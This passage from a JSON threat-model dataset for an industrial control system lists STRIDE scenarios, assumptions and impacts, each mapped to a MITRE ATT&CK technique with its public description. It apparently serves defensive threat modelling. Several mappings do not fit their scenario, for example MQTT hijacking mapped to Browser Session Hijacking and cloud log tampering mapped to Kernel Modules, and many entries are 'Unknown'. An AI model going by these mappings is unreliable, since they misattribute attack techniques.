                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targets the control center's HMI, rendering it unusable.",
            "Assumptions": [
                {
                    "Assumption": "External network defenses against DDoS attacks are not robust.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker can coordinate a large-scale botnet attack.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The HMI does not have fallback or redundant operational capabilities.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Loss of real-time monitoring and control capabilities, critical decision-making delays.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "HMI",
                "Operational Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware introduced into the MES causes excessive resource utilization, leading to a system crash.",
            "Assumptions": [
                {
                    "Assumption": "The MES is vulnerable to malware introduction.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Anti-malware mechanisms in the MES are either nonexistent or ineffective.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker can craft or deploy malware targeting known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "System downtime, disrupted production workflows, potential data loss.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malware",
                "MES",
                "Resource Exhaustion"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES to gain admin privileges and alter production workflows.",
            "Assumptions": [
                {
                    "Assumption": "The MES has a known or zero-day vulnerability.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker has the technical capability to exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "There are no strict privilege separation controls in place.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Unauthorized modifications to production workflows, potential production delays or safety hazards.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Exploit",
                "Admin Privileges",
                "MES"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised field device uses its elevated access to modify communication settings, disrupting normal operations.",
            "Assumptions": [
                {
                    "Assumption": "Field devices can alter their own or other devices' communication settings.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Field devices are susceptible to compromise and privilege escalation.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "There are no checks or safeguards against unauthorized configuration changes.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Disruption in data communication, potential loss of control and monitoring capabilities.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Field Device Compromise",
                "Communication Settings",
                "Operational Disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains unauthorized root access to the gateway and disables encryption for data transmissions.",
            "Assumptions": [
                {
                    "Assumption": "The gateway has vulnerabilities allowing root access exploitation.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker has the knowledge and tools required to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Encryption settings can be modified by an elevated access account.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality, risk of data interception and manipulation.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Root Access",
                "Gateway",
                "Encryption Disablement"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to gain access to the Control Center's HMI",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained valid authentication credentials or can bypass authentication",
                    "Role": "Attacker",
                    "Condition": "Credentials are compromised or weak authentication mechanisms are in place"
                },
                {
                    "Assumption": "Network defenses such as firewalls and intrusion detection systems are not adequately configured",
                    "Role": "Network Admin",
                    "Condition": "Inadequately monitored or configured network defenses"
                }
            ],
            "Potential Impact": "Unauthorized access to critical control systems, leading to potential manipulation of industrial processes",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "network service scanning",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fraudulent RTU to send inaccurate data to the Control Center",
            "Assumptions": [
                {
                    "Assumption": "The attacker can insert a rogue RTU into the network",
                    "Role": "Attacker",
                    "Condition": "Weak or absent device authentication controls"
                },
                {
                    "Assumption": "The network allows untrusted devices to send data to the Control Center",
                    "Role": "Network Admin",
                    "Condition": "Improperly enforced network access controls"
                }
            ],
            "Potential Impact": "Misleading operational data can disrupt manufacturing workflows and affect decision-making",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "MITM attack",
                "network injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker hijacks MQTT sessions between field devices and the gateway",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain access to the communication channel",
                    "Role": "Attacker",
                    "Condition": "Unsecured or poorly secured communication channels"
                },
                {
                    "Assumption": "MQTT sessions lack proper encryption",
                    "Role": "System Designer",
                    "Condition": "Absence of encryption mechanisms in data transmission"
                }
            ],
            "Potential Impact": "Compromise of sensitive data and potential manipulation of operational commands",
            "MITRE ATT&CK Keywords": [
                "session hijacking",
                "insecure protocol",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of field devices to disrupt industrial processes",
            "Assumptions": [
                {
                    "Assumption": "Field devices do not have secure firmware update mechanisms",
                    "Role": "Device Manufacturer",
                    "Condition": "Absent or weak firmware validation processes"
                },
                {
                    "Assumption": "Network security does not adequately prevent unauthorized firmware updates",
                    "Role": "Network Admin",
                    "Condition": "Lack of stringent network security protocols"
                }
            ],
            "Potential Impact": "Malfunctioning of field devices and potential shutdown of critical industrial processes",
            "MITRE ATT&CK Keywords": [
                "firmware modification",
                "malicious firmware",
                "device infection"
            ],
            "mitre_technique": {
                "name": "Module Firmware",
                "description": "Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   \n\nThis technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\nAn easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\n* Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  \n* Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  \n* Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   \n* A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  \n* Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",
                "id": "attack-pattern--efbf7888-f61b-4572-9c80-7e2965c60707",
                "technique_id": "T0839"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates data in transit between RTUs and the Control Center",
            "Assumptions": [
                {
                    "Assumption": "Data encryption is not implemented or can be bypassed",
                    "Role": "System Architect",
                    "Condition": "Lack of or weak encryption protocols"
                },
                {
                    "Assumption": "Network monitoring tools are inadequate to detect tampering",
                    "Role": "Network Security Team",
                    "Condition": "Insufficient network monitoring"
                }
            ],
            "Potential Impact": "Compromised data integrity can lead to incorrect operational decisions",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "man-in-the-middle",
                "data integrity attacks"
            ],
            "mitre_technique": {
                "name": "Manipulation of Control",
                "description": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.   \n\nMethods of Manipulation of Control include: \n\n* Man-in-the-middle  \n* Spoof command message \n* Changing setpoints  \n\nA Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. (Citation: Shelley Smith February 2008) The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. (Citation: Bruce Schneier January 2008)",
                "id": "attack-pattern--1af9e3fd-2bcc-414d-adbd-fe3b95c02ca1",
                "technique_id": "T0831"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to field devices and alters their configurations",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures are inadequate",
                    "Role": "Physical Security Manager",
                    "Condition": "Poor physical security controls"
                },
                {
                    "Assumption": "Devices lack robust local access authentication",
                    "Role": "Device Manufacturer",
                    "Condition": "Weak or no local authentication mechanisms"
                }
            ],
            "Potential Impact": "Alteration of configurations can compromise system performance and reliability",
            "MITRE ATT&CK Keywords": [
                "physical tampering",
                "local access attacks",
                "configuration manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing critical control actions in the Control Center",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are not properly maintained or protected",
                    "Role": "System Admin",
                    "Condition": "Improper logging and audit trail practices"
                },
                {
                    "Assumption": "User actions are not sufficiently logged",
                    "Role": "System Designer",
                    "Condition": "Inadequate action logging mechanisms"
                }
            ],
            "Potential Impact": "Difficulty in tracking user actions can impede incident investigation and accountability",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit evasion",
                "accountability deficiencies"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logs in cloud services to cover their tracks",
            "Assumptions": [
                {
                    "Assumption": "Cloud log integrity is not ensured",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of tamper-evident logging mechanisms"
                },
                {
                    "Assumption": "Access controls to logging information are poor",
                    "Role": "System Architect",
                    "Condition": "Weak access control policies"
                }
            ],
            "Potential Impact": "Obscured forensic evidence can complicate breach response and recovery efforts",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "cloud manipulation",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised HMI user account is used to perform malicious actions anonymously",
            "Assumptions": [
                {
                    "Assumption": "User credentials can be stolen or forged",
                    "Role": "Attacker",
                    "Condition": "Weak or compromised authentication mechanisms"
                },
                {
                    "Assumption": "Actions are not non-repudiable",
                    "Role": "System Designer",
                    "Condition": "Absence of non-repudiation mechanisms"
                }
            ],
            "Potential Impact": "Actions can be wrongfully attributed, leading to potential mishandling of security incidents",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "non-repudiation failure",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted during transmission between the gateway and cloud services",
            "Assumptions": [
                {
                    "Assumption": "Data encryption is either not used or can be broken",
                    "Role": "System Architect",
                    "Condition": "Lack of or weak encryption protocols"
                },
                {
                    "Assumption": "The attacker has access to network segments where data is transmitted",
                    "Role": "Attacker",
                    "Condition": "Network access or privileges"
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data can lead to industrial espionage or competitive disadvantage",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive information stored in cloud services is accessed by unauthorized users",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage lacks stringent access controls",
                    "Role": "Cloud Service Provider",
                    "Condition": "Poor cloud storage access policies"
                },
                {
                    "Assumption": "Authentication to cloud services can be bypassed or is weak",
                    "Role": "System Architect",
                    "Condition": "Weak cloud authentication mechanisms"
                }
            ],
            "Potential Impact": "Unrestricted access to sensitive data can lead to information leakage and loss of confidentiality",
            "MITRE ATT&CK Keywords": [
                "unauthorized access",
                "cloud storage breach",
                "sensitive data exposure"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider transfers sensitive information to an external party",
            "Assumptions": [
                {
                    "Assumption": "Insiders have access to sensitive data and can copy it",
                    "Role": "Insider",
                    "Condition": "Unrestricted access to sensitive data"
                },
                {
                    "Assumption": "Data transfer mechanisms are not adequately monitored",
                    "Role": "System Admin",
                    "Condition": "Lack of data exfiltration monitoring"
                }
            ],
            "Potential Impact": "Compromise of confidential information through insider threats",
            "MITRE ATT&CK Keywords": [
                "data exfiltration",
                "insider threat",
                "information leakage"
            ],
            "mitre_technique": {
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
                "technique_id": "T1029"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the Control Center's HMI",
            "Assumptions": [
                {
                    "Assumption": "The HMI lacks adequate DDoS mitigation",
                    "Role": "System Designer",
                    "Condition": "Absence of DDoS protection mechanisms"
                },
                {
                    "Assumption": "The network can be overwhelmed by excessive traffic",
                    "Role": "Network Admin",
                    "Condition": "Insufficient network capacity or defenses"
                }
            ],
            "Potential Impact": "Disruption of monitoring and control capabilities, affecting operational continuity",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "service disruption",
                "network flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the gateway with resource exhaustion attacks",
            "Assumptions": [
                {
                    "Assumption": "The gateway's resource limits can be exhausted",
                    "Role": "Attacker",
                    "Condition": "Unprotected resource allocation"
                },
                {
                    "Assumption": "Monitoring and mitigation strategies are insufficient",
                    "Role": "System Admin",
                    "Condition": "Lack of robust monitoring and defense mechanisms"
                }
            ],
            "Potential Impact": "Downtime in data transmission between field devices and cloud services",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "gateway attack",
                "service degradation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious software disrupts the operations of field devices",
            "Assumptions": [
                {
                    "Assumption": "Field devices can be infected with malware",
                    "Role": "Attacker",
                    "Condition": "Unprotected or weakly protected devices"
                },
                {
                    "Assumption": "Malware can spread without detection",
                    "Role": "System Admin",
                    "Condition": "Lack of comprehensive malware detection mechanisms"
                }
            ],
            "Potential Impact": "Shutdown of critical industrial processes and interruption of production",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "device disruption",
                "industrial sabotage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the MES database",
            "Assumptions": [
                {
                    "Assumption": "Database access controls can be bypassed or are weak",
                    "Role": "Database Admin",
                    "Condition": "Weak or misconfigured access controls"
                },
                {
                    "Assumption": "Attackers can exploit known vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Presence of unpatched vulnerabilities"
                }
            ],
            "Potential Impact": "Unauthorized data manipulation, leading to potential falsification of operational data",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "database compromise",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider escalates privileges to gain unauthorized access to sensitive data",
            "Assumptions": [
                {
                    "Assumption": "Insider has basic access and can exploit system vulnerabilities",
                    "Role": "Insider",
                    "Condition": "Presence of exploitable vulnerabilities"
                },
                {
                    "Assumption": "Privilege escalation techniques can be used",
                    "Role": "Attacker",
                    "Condition": "Lack of proper privilege management"
                }
